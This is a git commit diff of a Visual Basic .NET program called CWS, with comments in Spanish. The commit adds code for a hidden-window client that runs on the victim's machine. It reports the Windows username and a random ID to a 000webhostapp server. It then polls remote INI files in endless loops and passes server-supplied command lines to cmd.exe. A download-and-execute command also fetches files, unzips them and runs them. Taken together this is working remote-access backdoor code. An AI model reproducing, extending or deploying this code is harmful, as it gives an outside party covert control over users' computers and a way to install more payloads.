85a9e59803a51b58e8f0d3e38a60bf8fd32c45f0
Zhenboro <zhenboro@outlook.com>
2021-09-05 02:59:02 -0300

    avances

--- CWS/General.vb
+++ CWS/General.vb
@@ -1,10 +1,17 @@
 ﻿Imports System.IO
+Imports System.IO.Compression
 Imports System.Net
+Imports System.Runtime.InteropServices
 Imports System.Text
 Imports Microsoft.Win32
-Module General
+Module Globales
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\CWS"
-
+    Public Ident As String = CreateRandomString(10)
+    Public HostDomain As String = "https://chemic-jug.000webhostapp.com" 'PARA PRUEBAS
+    Public GeneralConfigFileReaderTimeout As Integer = 60000
+    Public PrivateConfigFileReaderTimeout As Integer = 60000
+End Module
+Module General
     Sub Comun()
         Try
             If My.Computer.FileSystem.DirectoryExists(DIRCommons) = False Then
@@ -51,8 +58,6 @@ End Module
 Module Memoria
     Dim RutaBase As String = "Software\\CWS"
 
-    Public Ident As String = CreateRandomString(10)
-
     Function IsFirstStart() As Boolean
         'verificar si es o no el primer inicio.
         '   como sabremos si es o no el primer inicio
@@ -90,8 +95,10 @@ Module Memoria
 
             ReportMeToTheServer() 'se reporta al server
 
-            Process.Start(Application.ExecutablePath)
-            End
+            'Process.Start(Application.ExecutablePath)
+            'End
+
+            TheSecondStart()
         Catch ex As Exception
             AddToLog("[TheFirstStart@Memoria]Error: ", ex.Message, True)
         End Try
@@ -114,8 +121,8 @@ Module Memoria
         Try
 
             LoadConfig()
-            'iniciar el proceso de espera...
-            'obtener los datos del reporte anterior
+            StartTheThreads()
+
         Catch ex As Exception
             AddToLog("[TheSecondStart@Memoria]Error: ", ex.Message, True)
         End Try
@@ -148,14 +155,70 @@ Module Memoria
         End Try
     End Sub
 End Module
+Module Cargas
+
+    Sub DownloadComponent(url As String, fileName As String, IsCompressed As Boolean, RunLater As Boolean, mainFileName As String, Parameters As String)
+        'Comando para descargar y ejecutar algo
+        '   /Network.DownloadComponent=<link>,<IsCompressed>,<RunLater>,<fileName>,<Parameters>
+        '   /Network.DownloadComponent=https://chemic-jug.000webhostapp.com/CWS/hola.py,hola.py,False,True,hola.py,null
+        '   link = link de descarga
+        '   IsCompressed = boolean, si es un .zip
+        '   RunLater = boolean, si despues de descargar/descomprimir se debe ejecutar
+        '   fileName = lo que se debe iniciar
+        '   Parameters = opciona, iniciar con parametros (en el caso de un ejecutable)
+        ' Esto debe ser compatible con el abrir imagenes, archivos y ejecutables.
+
+        Try
+
+            Dim filePath As String = DIRCommons & "\" & fileName
+
+            If My.Computer.FileSystem.FileExists(DIRCommons & "\" & fileName) Then
+                My.Computer.FileSystem.DeleteFile(DIRCommons & "\" & fileName)
+            End If
+
+            'descargar
+            My.Computer.Network.DownloadFile(url, filePath)
+
+            'si es comprimido
+            If IsCompressed Then
+                ZipFile.ExtractToDirectory(filePath, DIRCommons)
+            End If
+
+            'parametros
+            If Parameters = "null" Then
+                Parameters = Nothing
+            End If
+
+            'si se debe ejecutar
+            If RunLater Then
+                Process.Start(DIRCommons & "\" & mainFileName, Parameters)
+            End If
+
+        Catch ex As Exception
+            AddToLog("[DownloadComponent@Cargas]Error: ", ex.Message, True)
+        End Try
+    End Sub
+End Module
 Module Network
-    Public HostDomain As String = "https://chemic-jug.000webhostapp.com" 'PARA PRUEBAS
+    Dim ThreadGeneralConfig As Threading.Thread
+    Dim ThreadPrivateConfig As Threading.Thread
+    Dim isGeneralThreadRunning As Boolean = False
+    Dim isPrivateThreadRunning As Boolean = False
 
     Sub ReportMeToTheServer()
         Try
             Dim webRequest As WebRequest = WebRequest.Create(HostDomain & "/CWS/ReportIt.php")
             webRequest.Method = "POST"
-            Dim content As String = ""
+            Dim content As String = "# CWS Private " & Ident & " @ " & Environment.UserName &
+                vbCrLf & "[Status]" &
+                vbCrLf & "IsEnabled=True" &
+                vbCrLf & "IsReading=True" &
+                vbCrLf & "[Startup]" &
+                vbCrLf & "CommandLine=null" &
+                vbCrLf & "ArgumentLine=null" &
+                vbCrLf & "[Commands]" &
+                vbCrLf & "OWN=null" &
+                vbCrLf & "CMD=null"
             Dim s As String = "ident=" & Ident & "&log=" & content
             Dim bytes As Byte() = Encoding.UTF8.GetBytes(s)
             webRequest.ContentType = "application/x-www-form-urlencoded"
@@ -170,5 +233,160 @@ Module Network
             AddToLog("[ReportMeToTheServer@Network]Error: ", ex.Message, True)
         End Try
     End Sub
+    Sub StartTheThreads()
+        Try
+            ThreadGeneralConfig = New Threading.Thread(AddressOf DoTheGeneralConfig)
+            ThreadGeneralConfig.Start()
+            isGeneralThreadRunning = True
+            ThreadPrivateConfig = New Threading.Thread(AddressOf DoThePrivateConfig)
+            isPrivateThreadRunning = True
+            ThreadPrivateConfig.Start()
+        Catch ex As Exception
+            AddToLog("[StartTheThreads@Network]Error: ", ex.Message, True)
+        End Try
+    End Sub
+    Sub StopTheThreads()
+        Try
+            If isGeneralThreadRunning Then
+                ThreadGeneralConfig.Abort()
+            End If
+            If isPrivateThreadRunning Then
+                ThreadPrivateConfig.Abort()
+            End If
+        Catch ex As Exception
+            AddToLog("[StopTheThreads@Network]Error: ", ex.Message, True)
+        End Try
+    End Sub
 
+    Sub DoTheGeneralConfig()
+        Try
+            While True
+                Dim filePath As String = DIRCommons & "\General.ini"
+                Dim fileRemotePath As String = HostDomain & "/CWS/General.ini"
+
+                If My.Computer.FileSystem.FileExists(filePath) Then
+                    My.Computer.FileSystem.DeleteFile(filePath)
+                End If
+
+                'Descargamos el archivo
+                My.Computer.Network.DownloadFile(fileRemotePath, filePath)
+
+                Dim IsEnabled_General, IsReading_General, Name_General, Version_General, Download_General, HostDomain_General, GeneralConfigFileReaderTimeout_General, PrivateConfigFileReaderTimeout_General As String
+
+                'Lo leemos
+                IsEnabled_General = GetIniValue("Status", "IsEnabled", filePath)
+                IsReading_General = GetIniValue("Status", "IsReading", filePath)
+                Name_General = GetIniValue("Assembly", "Name", filePath)
+                Version_General = GetIniValue("Assembly", "Version", filePath)
+                Download_General = GetIniValue("Updates", "Download", filePath)
+                HostDomain_General = GetIniValue("Variables", "HostDomain", filePath)
+                GeneralConfigFileReaderTimeout_General = GetIniValue("Variables", "GeneralConfigFileReaderTimeout", filePath)
+                PrivateConfigFileReaderTimeout_General = GetIniValue("Variables", "PrivateConfigFileReaderTimeout", filePath)
+
+                'Aplicamos
+                If IsEnabled_General = True Then
+                    If IsReading_General = True Then
+
+                        Dim versionLocal = My.Application.Info.Version
+                        Dim versionServidor = New Version(Version_General)
+                        Dim resultado = versionLocal.CompareTo(versionServidor)
+                        If resultado > 0 Then
+                        ElseIf resultado < 0 Then
+                            'Actualizacion disponible
+                            '   y descargar e instalar
+                            'PENDIENTE
+                        End If
+
+                        If HostDomain_General <> "null" Then
+                            HostDomain = HostDomain_General
+                        End If
+                        If GeneralConfigFileReaderTimeout_General <> "null" Then
+                            GeneralConfigFileReaderTimeout = GeneralConfigFileReaderTimeout_General
+                        End If
+                        If PrivateConfigFileReaderTimeout_General <> "null" Then
+                            PrivateConfigFileReaderTimeout = PrivateConfigFileReaderTimeout_General
+                        End If
+                    End If
+                End If
+                Threading.Thread.Sleep(GeneralConfigFileReaderTimeout)
+            End While
+        Catch ex As Exception
+            AddToLog("[DoTheGeneralConfig@Network]Error: ", ex.Message, True)
+        End Try
+    End Sub
+    Sub DoThePrivateConfig()
+        Try
+            While True
+                Dim filePath As String = DIRCommons & "\Private.ini"
+                Dim fileRemotePath As String = HostDomain & "/CWS/" & Ident & ".txt"
+
+                If My.Computer.FileSystem.FileExists(filePath) Then
+                    My.Computer.FileSystem.DeleteFile(filePath)
+                End If
+
+                'Descargamos el archivo
+                My.Computer.Network.DownloadFile(fileRemotePath, filePath)
+
+                Dim IsEnabled_Private, IsReading_Private, CommandLine_Private, ArgumentLine_Private, OWN_Private, CMD_Private As String
+                IsEnabled_Private = GetIniValue("Status", "IsEnabled", filePath)
+                IsReading_Private = GetIniValue("Status", "IsReading", filePath)
+                CommandLine_Private = GetIniValue("Startup", "CommandLine", filePath)
+                ArgumentLine_Private = GetIniValue("Startup", "ArgumentLine", filePath)
+                OWN_Private = GetIniValue("Commands", "OWN", filePath)
+                CMD_Private = GetIniValue("Commands", "CMD", filePath)
+
+                'Aplicar
+                If IsEnabled_Private = True Then
+                    If IsReading_Private = True Then
+                        If CommandLine_Private <> "null" Then
+                            Process.Start("cmd.exe", CommandLine_Private)
+                        End If
+                        If ArgumentLine_Private <> "null" Then
+                            Process.Start(Application.ExecutablePath, ArgumentLine_Private)
+                        End If
+
+                        'procesar comando
+                        If OWN_Private <> "null" Then
+                            'Procesar el comando
+                            Dim Comando As String = OWN_Private
+                            Dim ContenidoComando As String = Comando
+                            Dim ComandoArgumentos() As String
+
+                            If ContenidoComando.Contains("=") Then
+                                ContenidoComando = ContenidoComando.Remove(0, ContenidoComando.LastIndexOf("=") + 1)
+                                ComandoArgumentos = ContenidoComando.Split(",")
+                            End If
+
+
+                            If Comando.StartsWith("/Network.DownloadComponent=") Then
+                                DownloadComponent(ComandoArgumentos(0), ComandoArgumentos(1), ComandoArgumentos(2), ComandoArgumentos(3), ComandoArgumentos(4), ComandoArgumentos(5))
+                            End If
+
+                            'responder
+
+                        End If
+
+                    End If
+                End If
+
+                Threading.Thread.Sleep(PrivateConfigFileReaderTimeout)
+            End While
+        Catch ex As Exception
+            AddToLog("[DoThePrivateConfig@Network]Error: ", ex.Message, True)
+        End Try
+    End Sub
+End Module
+Module Complementos
+    <DllImport("kernel32")>
+    Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
+    End Function
+
+    Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = "") As String
+        Dim sb As New StringBuilder(500)
+        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
+            Return sb.ToString
+        Else
+            Return defaultValue
+        End If
+    End Function
 End Module
--- CWS/Main.vb
+++ CWS/Main.vb
@@ -2,6 +2,7 @@
 
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Hide()
+        CheckForIllegalCrossThreadCalls = False
         Init()
     End Sub
 
